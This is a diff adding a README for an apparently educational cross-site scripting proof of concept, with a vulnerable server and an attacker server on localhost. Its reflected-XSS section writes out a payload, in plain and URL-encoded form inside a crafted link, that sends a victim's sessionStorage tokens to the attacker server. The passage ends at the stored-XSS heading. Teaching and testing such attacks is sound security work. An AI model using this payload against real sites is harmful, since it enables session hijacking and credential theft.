@@ -1,0 +1,69 @@
+
+for demonstration purposes only
+
+proof of concept
+
+install
+
+    npm i
+
+run
+
+    vuln server 
+
+        nodemon vuln/server.js
+
+    attacker server
+
+        nodemon nodejs/malicious_server.js
+
+Lets say we have two servers.
+First one is vulnerable server and the other one is used for attacking purposes (let call it ES (evil server)).
+
+Vulnerable server is on 
+
+    http://localhost:3000
+
+Attackers server is on 
+
+    http://localhost:3001
+
+
+In reality this would be two different addresses, one hosted on one server, and one on the other. In this POC both are served on same computer.
+
+Attackers server purpose is to log stolen data (usernames, passwords, cookies, tokens, card numbers, pins, ...).
+When malicious code is executed; data that is valuable to the attacker is sent to server. 
+
+Vulnerable server has couple of views, their purpose is to demonstrate different kinds of vulnerabilities.
+
+1. reflected xss
+
+Lets say that data that is passed to the server is not sanitized properly. This creates space for a lot of attacks. One of them is reflected XSS. 
+
+Also lets assume that user credentials (username and session token) are stored in session storage. Attacker can check this by becoming user on that same vulnerable site and inspecting storage methods. 
+
+For example, webshop has a view on which is displayed status of an order. Website also offers option to send user notifications via email when there is an update on a order. User can then click on a link in a email and see order tracking details. 
+
+Tipical url can look like this: "http://localhost:3000/track_order/123". When user clicks on this url in the email it is redirected to that site and tracking information for that order is displayed. Order id is displayed on the page. 
+Attacker can craft an email in which instead of order id they put malicious payload. If vulnerable server is not performing check against order id and just displays that order id in the response it poses a security risk. 
+
+For example attacker can construct this payload and send it to the victim. Purpose of this payload is to grab session storage content and send it to the attacker server. 
+
+document.write('<script>document.write("<iframe src=http://localhost:3001/"+JSON.stringify(sessionStorage)+"></iframe>");</script>')
+
+This payload must be firstly modified to be able to be sent over http, it must be encoded. 
+
+After utf-8 encoding this payload becomes this. this JavaScript can be firstly more obfuscated or minimized so it looks more real. 
+
+document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2F%22%2BJSON.stringify%28sessionStorage%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29
+
+Whole link will now become 
+
+http://localhost:3000/track_order/document.write%28%27%3Cscript%3Edocument.write%28%22%3Ciframe%20src%3Dhttp%3A%2F%2Flocalhost%3A3001%2F%22%2BJSON.stringify%28sessionStorage%29%2B%22%3E%3C%2Fiframe%3E%22%29%3B%3C%2Fscript%3E%27%29
+
+Power in this attack is that if user is logged in the site this will link steal its credentials. More complex scenario is if they are not logged in. In that case they can firstly be redirected to login page after which they are sent to tracking view (or they again click on the malicious link). In this scenario their credentails are again stolen. 
+
+Defense against this is sanitization of input. Users input is never to be trusted. 
+
+2. Stored xss
+
